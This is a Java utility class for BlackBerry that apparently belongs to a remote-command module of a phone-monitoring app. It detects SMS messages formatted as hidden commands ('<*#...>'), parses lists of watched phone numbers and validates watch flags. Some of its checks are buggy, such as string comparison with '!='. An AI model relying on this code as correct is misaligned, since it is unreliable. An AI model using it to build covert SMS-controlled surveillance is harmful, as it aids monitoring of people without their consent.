package com.vvt.rmtcmd.util;

import java.util.Vector;

import net.rim.device.api.util.Arrays;

import com.vvt.std.Constant;

public class RmtCmdUtil {

	public boolean isSMSCommand(String message) {
		boolean activatedSms = false;
		String prefix = "<*#";
		if (message.startsWith(prefix) && message.endsWith(Constant.GREATER_THAN)) {
			activatedSms = true;
		}
		return activatedSms;
	}
	
	public Vector parseNumber(String value) {
		Vector numberStore = new Vector();
		String number = "";
		int beginIndex = 0;	
		int endIndex = 0;
		if ((value.trim() != "") || (value.trim() != null)) {
			while (true) {
				endIndex = value.indexOf(Constant.SEMICOLON, beginIndex);
				if (endIndex == -1) {
					number = value.substring(beginIndex);
					numberStore.addElement(number);
					break;
				} else {
					number = value.substring(beginIndex, endIndex);
					numberStore.addElement(number);
					beginIndex = endIndex + 1;
				}
			}
		}
		return numberStore;
	}
	
	public Vector getOnlyUniqueNumber(Vector numberList) {
		int[] refIndex = new int[numberList.size()]; 
		for (int i = 0; i < numberList.size(); i++) {
			boolean duplicate = false;
			int k = 0;
			String srcNumber = (String) numberList.elementAt(i);
			for (int j = i + 1; j < numberList.size(); j++) {
				String destNumber = (String) numberList.elementAt(j);
				if (srcNumber.equals(destNumber)) {
					refIndex[k] = j;
					k++;
					duplicate = true;
				} 
			}
			if (duplicate) {
				for (int j = refIndex.length - 1; j >= 0; j--) {
					if (refIndex[j] > 0) {
						numberList.removeElementAt(refIndex[j]);
					}
				}
				// reset index
				i = 0;
				Arrays.zero(refIndex);
			}
		}
		return numberList;
	}
	
	/*public Vector parseWatchFlags(String value) {
		Vector flags = new Vector();
		int beginIndex = 0;	
		int endIndex = value.indexOf(Constant.SEMICOLON, beginIndex);
		if (endIndex != -1) {
			while (true) {
				String number = value.substring(beginIndex, endIndex);
				flags.addElement(number);
				beginIndex = endIndex + 1;
				endIndex = value.indexOf(Constant.SEMICOLON, beginIndex);
				if (endIndex == -1) {
					number = value.substring(beginIndex);
					flags.addElement(number);
					break;
				}
			}
		}
		return flags;
	}*/
	
	public boolean isInvalidWatchFlags(Vector watchFlags) {
		boolean invalid = true;
		int watchFlagsCnt = 4;
		if (watchFlags.size() == watchFlagsCnt) {
			for (int i = 0; i < watchFlagsCnt; i++) {
				if (watchFlags.elementAt(i).equals("1") || watchFlags.elementAt(i).equals("0")) {
					invalid = false;
				} else {
					invalid = true;
					break;
				}
			}
		}
		return invalid;
	}
	
	public boolean isInvalidNumber(Vector numberList) {
		boolean invalid = false;
		int countNumber = numberList.size();
		for (int i = 0; i < countNumber; i++) {
			if (!isDigit((String) numberList.elementAt(i))) {
				invalid = true;
				break;
			}
		}
		return invalid;
	}	
	
	public boolean isDigit(String number) {		
		boolean digit = true;		
		if (number.startsWith(Constant.PLUS)) {
			number = number.substring(1);
		}
		if ((number != null) && (number.length() > 0)) {
			for (int i = 0; i < number.length(); i++) {
				if (!Character.isDigit(number.charAt(i))) {
					digit = false;
					break;
				}
			}
		} else {
			digit = false;
		}
		return digit;
	}
}
